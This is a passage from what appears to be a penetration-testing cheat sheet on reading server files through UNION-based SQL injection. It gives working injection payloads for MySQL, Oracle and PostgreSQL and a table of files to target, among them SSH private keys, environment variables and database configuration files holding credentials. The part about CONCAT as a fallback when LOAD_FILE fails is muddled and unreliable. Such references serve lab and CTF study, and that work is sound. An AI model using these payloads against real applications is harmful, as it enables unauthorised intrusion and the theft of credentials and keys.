#### Prerequisites
- The SQL injection vulnerability must allow UNION injection.
- The database must support file reading functions (e.g., `LOAD_FILE()` in MySQL).
 - The injected query’s result must be reflected in the webpage (the injected column should be visible).

## Execution
- **Determine number and type of columns**
    - First, find out how many columns the original query has and which ones reflect output, using standard techniques (ORDER BY, UNION SELECT with NULLs or values).
    - Ensure the target column can display text.
    
- **Basic payload to read a file in MySQL:**
```sql
' UNION SELECT NULL, LOAD_FILE('/etc/passwd')-- -
```
- **Advanced example using CONCAT to control output**
If `LOAD_FILE()` gives an error or is unsupported, you can try concatenation functions to format the output:

```sql
' UNION SELECT NULL, CONCAT('FILE CONTENT:', LOAD_FILE('/etc/passwd'))-- -
```

- **Alternatives for other database engines**

- **Oracle:** No direct `LOAD_FILE()`, but packages like `UTL_FILE` can be used with required privileges.
```sql
' UNION SELECT utl_file.get_line(utl_file.fopen('DIRECTORY','filename','r'), 1) FROM dual-- -
```
- **PostgreSQL:** Functions like `pg_read_file()` can be used if permitted.

```sql
' UNION SELECT NULL, pg_read_file('/etc/passwd')-- -
```

## Common Files to Target for LFI via SQLi
| OS          | File                                          | Purpose                                                  |
| ----------- | --------------------------------------------- | -------------------------------------------------------- |
| **Linux**   | `/etc/passwd`                                 | List of local users                                      |
|             | `/etc/hostname`                               | Server hostname                                          |
|             | `/proc/self/environ`                          | Environment variables (can reveal `PATH`, secrets, etc.) |
|             | `/var/www/html/config.php`                    | App config files (may contain DB credentials)            |
|             | `/root/.ssh/id_rsa`                           | Private SSH keys (if readable)                           |
|             | `/etc/mysql/my.cnf`                           | MySQL config (may expose passwords or file paths)        |
| **Windows** | `C:\\boot.ini`                                | Boot configuration                                       |
|             | `C:\\Windows\\win.ini`                        | System info                                              |
|             | `C:\\xampp\\mysql\\bin\\my.ini`               | XAMPP MySQL config                                       |
|             | `C:\\Users\\Administrator\\Desktop\\flag.txt` | CTF-style target file                                    |